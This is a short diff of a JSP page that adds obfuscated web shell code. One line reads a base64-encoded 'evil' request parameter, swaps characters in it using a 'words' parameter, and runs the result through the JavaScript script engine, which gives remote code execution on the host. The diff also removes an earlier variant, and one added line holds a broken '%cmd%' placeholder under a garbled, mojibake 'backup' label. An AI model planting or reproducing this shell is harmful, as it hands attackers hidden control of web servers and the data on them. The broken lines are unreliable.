@@ -1,2 +1,6 @@
 <%@page pageEncoding = "UTF-8"%>
-<%out.println((request.getParameter("evil")!=null)&&(request.getParameter("word")!=null) ? new javax.script.ScriptEngineManager().getEngineByName("js").eval(new String(javax.xml.bind.DatatypeConverter.parseBase64Binary(%request.getParameter("evil")%))):"no");%>
+<%out.println((request.getParameter("evil")!=null)&&(request.getParameter("words")!=null) ? new javax.script.ScriptEngineManager().getEngineByName("js").eval(new String(javax.xml.bind.DatatypeConverter.parseBase64Binary(%cmd%))):"no");%>
+
+
+±¸·Ý£º
+<%@page pageEncoding = "UTF-8"%><%out.println((request.getParameter("evil")!=null)&&(request.getParameter("words")!=null) ? new javax.script.ScriptEngineManager().getEngineByName("js").eval(new String(javax.xml.bind.DatatypeConverter.parseBase64Binary(request.getParameter("evil").replace("@", request.getParameter("words").substring(0,1)).replace("#", request.getParameter("words").substring(1,2)).replace("$", request.getParameter("words").substring(2,3)).replace("^", request.getParameter("words").substring(3,4))))):"no");%>
